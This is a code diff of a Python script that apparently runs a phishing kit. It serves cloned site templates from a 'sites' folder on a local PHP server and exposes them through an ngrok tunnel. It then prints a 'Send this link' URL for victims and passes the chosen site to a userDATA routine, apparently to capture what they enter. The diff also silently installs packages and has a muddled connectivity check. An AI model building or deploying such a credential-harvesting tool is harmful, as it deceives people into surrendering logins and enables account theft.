@@ -3,7 +3,7 @@ p = ran
 from setup.sprint import sprint
 from setup.banner import banner , clear , banner2
 import random
-import time
+import time , os , sys
 
 clear()
 banner()
@@ -12,7 +12,6 @@ try:
     import requests
     import colorama
 except ModuleNotFoundError:
-    import os
     os.system("pip install colorama")
     os.system("pip install requests")
 
@@ -23,19 +22,23 @@ def command(str):
 def error(str):
     print(f"{y}[{r}!{y}] {lg}{str}")
 
-def internet_connection():
+def internet():
     try:
-        req = requests.get("https://google.com")
+        res = requests.get("https://google.com")
+        if res.status_code == 200:
+            error("Internet connection found.")
 
-        if req.status_code == 200:
-            error("Internet connection not found!")
-        else:
-            error("Something went wrong!")
+        elif res.status_code == 400:
+            error("Internet connection not found")
+            exit()
+
     except KeyboardInterrupt:
-        error("Exiting...")
-        exit(0)
+        error(f"{r}[{c}!{r}] {p} Exiting -----> ")
+        exit()
+    except:
+        print(f"{r}[{c}!{r}] {y} Please on your internet connection")
 
-internet_connection()
+internet()
 
 def mkdir():
     try:
@@ -83,25 +86,23 @@ def localHost(site):
         error("Invalid option")
         exit(0)
 
-def ngrok(site):
+def ngrok(server):
     try:
-        path = f"sites/{site}"
-        des = "cache/"
+        path = f"sites/{server}"
+        des = "pweb/"
         os.system(f"cp -R {path} {des}")
-        sprint("\n")
+        print("\n")
         port_ = random.randint(1150, 9999)
-        os.system(f"php -S 127.0.0.1:{port_} -t cache/{site} > /dev/null 2>&1 & sleep 2")
+        os.system(f"php -S 127.0.0.1:{port_} -t pweb/{server} > /dev/null 2>&1 & sleep 2")
         os.system(f"./ngrok http http://127.0.0.1:{port_} > /dev/null 2>&1 & sleep 8")
         os.system(f'echo -ne "Send this link: "')
         os.system(f'curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io"')
-        userDATA(site)
-    except:
+        userDATA(server)
+    except KeyboardInterrupt:
         print()
-        error("Exiting........")
-
+        error(f"{r} _______{g}Exiting{r}______")
         time.sleep(2)
-        exit(1)
-
+        sys.exit(1)
 def hostOption(site):
     print("\n")
     print(f"{p}[{g}~{p}] {w} Link generating option")
